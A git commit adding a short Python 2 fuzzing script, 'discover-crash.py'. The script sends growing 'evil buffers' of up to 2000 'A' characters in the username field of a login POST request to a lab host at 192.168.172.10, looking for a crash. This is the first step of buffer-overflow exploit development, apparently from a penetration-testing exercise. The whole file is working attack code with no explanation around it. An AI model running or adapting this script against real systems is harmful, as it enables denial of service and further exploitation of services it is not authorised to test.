57aa1b083449fc5fe1c9e7ee0127ed65d960bda3
tobor <rosborne@osbornepro.com>
2020-05-04 13:38:42 -0600

    Create discover-crash.py

---
+++ discover-crash.py
@@ -0,0 +1,44 @@
+#!/usr/bin/env python
+# Fuzz the username field of a web application up to 2000 bytes
+import socket
+import time
+import sys
+
+
+
+size = 100
+
+while(size < 2000):
+    try:
+        print "\nSending evil buffer with %s bytes" % size
+    
+        inputBuffer = "A" * size
+
+        content = "username=" + inputBuffer + "&password=A"
+
+        # Place contents of bufferPOST.txt here
+        buffer = "POST /login HTTP/1.1\r\n"
+        buffer += "Host: 192.168.172.10\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
+        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+        buffer += "Accept-Encoding: gzip, deflate\r\n"
+        buffer += "Referer: http://192.168.172.10/login\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length: "+str(len(content))+"\r\n"
+        buffer += "\r\n"
+
+        buffer += content
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s.connect(("192.168.172.10", 80)) 
+        s.send(buffer) 
+
+        s.close()
+        
+        size += 100
+        time.sleep(3)
+
+    except: 
+        print "Could not connect!"
+        sys.exit()
